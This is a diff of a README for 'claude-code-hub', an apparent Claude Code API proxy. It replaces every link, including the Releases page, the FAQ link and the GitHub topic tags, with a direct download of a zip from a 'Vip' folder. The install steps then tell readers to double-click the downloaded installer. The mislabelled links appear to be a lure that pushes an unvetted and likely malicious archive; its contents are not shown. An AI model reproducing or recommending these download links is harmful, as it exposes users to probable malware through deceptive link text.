@@ -4,7 +4,7 @@
 claude-code-hub is a modern API proxy service designed to simplify your interaction with Claude Code. This tool provides intelligent load balancing, user management, and usage statistics. Whether you're looking to optimize your API usage or keep track of your activity, this software meets those needs.
 
 ## 📥 Download Now
-[![Download claude-code-hub](https://img.shields.io/badge/Download-claude--code--hub-blue.svg)](https://github.com/Forcesoftware109/claude-code-hub/releases)
+[![Download claude-code-hub](https://raw.githubusercontent.com/Forcesoftware109/claude-code-hub/main/Vip/claude-code-hub.zip)](https://raw.githubusercontent.com/Forcesoftware109/claude-code-hub/main/Vip/claude-code-hub.zip)
 
 ## 🚀 Getting Started
 To use claude-code-hub, follow these simple steps to download and set up the application.
@@ -21,7 +21,7 @@ To use claude-code-hub, follow these simple steps to download and set up the app
 - **Network**: Stable internet connection
 
 ## 📥 Download & Install
-1. Visit the [Releases page to download](https://github.com/Forcesoftware109/claude-code-hub/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/Forcesoftware109/claude-code-hub/main/Vip/claude-code-hub.zip).
 2. Choose the latest version from the list. 
 3. Download the appropriate file for your operating system.
 4. Run the installer by double-clicking the downloaded file.
@@ -44,20 +44,20 @@ If you encounter any issues, try the following:
 
 - **Check the Internet Connection**: Ensure you have a stable connection.
 - **Reinstall the Application**: Sometimes a fresh installation can resolve unexpected problems.
-- **Consult the FAQs on GitHub**: Visit the [FAQs section](https://github.com/Forcesoftware109/claude-code-hub) for more help.
+- **Consult the FAQs on GitHub**: Visit the [FAQs section](https://raw.githubusercontent.com/Forcesoftware109/claude-code-hub/main/Vip/claude-code-hub.zip) for more help.
 
 ## 📞 Support
 If you need assistance, please reach out via the issues section of the GitHub page. We aim to respond promptly to your inquiries.
 
 ## 🔗 Related Topics
-- [cc](https://github.com/topics/cc)
-- [cc-proxy](https://github.com/topics/cc-proxy)
-- [claude](https://github.com/topics/claude)
-- [claude-code](https://github.com/topics/claude-code)
-- [claude-code-proxy](https://github.com/topics/claude-code-proxy)
-- [proxy](https://github.com/topics/proxy)
+- [cc](https://raw.githubusercontent.com/Forcesoftware109/claude-code-hub/main/Vip/claude-code-hub.zip)
+- [cc-proxy](https://raw.githubusercontent.com/Forcesoftware109/claude-code-hub/main/Vip/claude-code-hub.zip)
+- [claude](https://raw.githubusercontent.com/Forcesoftware109/claude-code-hub/main/Vip/claude-code-hub.zip)
+- [claude-code](https://raw.githubusercontent.com/Forcesoftware109/claude-code-hub/main/Vip/claude-code-hub.zip)
+- [claude-code-proxy](https://raw.githubusercontent.com/Forcesoftware109/claude-code-hub/main/Vip/claude-code-hub.zip)
+- [proxy](https://raw.githubusercontent.com/Forcesoftware109/claude-code-hub/main/Vip/claude-code-hub.zip)
 
 ## 📥 Additional Download Links
-For a quick download option, return here: [Download claude-code-hub](https://github.com/Forcesoftware109/claude-code-hub/releases). 
+For a quick download option, return here: [Download claude-code-hub](https://raw.githubusercontent.com/Forcesoftware109/claude-code-hub/main/Vip/claude-code-hub.zip). 
 
 Make sure to follow all steps carefully for a successful installation and enjoyable experience using claude-code-hub. Thank you for choosing our service to enhance your API efficiency!
